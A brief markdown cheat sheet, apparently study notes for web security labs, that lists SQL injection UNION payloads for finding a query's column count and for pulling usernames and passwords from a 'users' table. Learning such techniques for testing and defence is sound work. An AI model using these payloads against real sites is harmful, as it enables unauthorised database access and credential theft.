# Union attacks

Determine number of columns:

```sql
'+UNION+SELECT+'abc','def'--
```

* example is for 2 columns

```
' UNION SELECT NULL-- 
' UNION SELECT NULL,NULL-- 
' UNION SELECT NULL,NULL,NULL-- 
etc.
```

Retrieve contents of `users` table:

```sql
'+UNION+SELECT+username,+password+FROM+users--
```
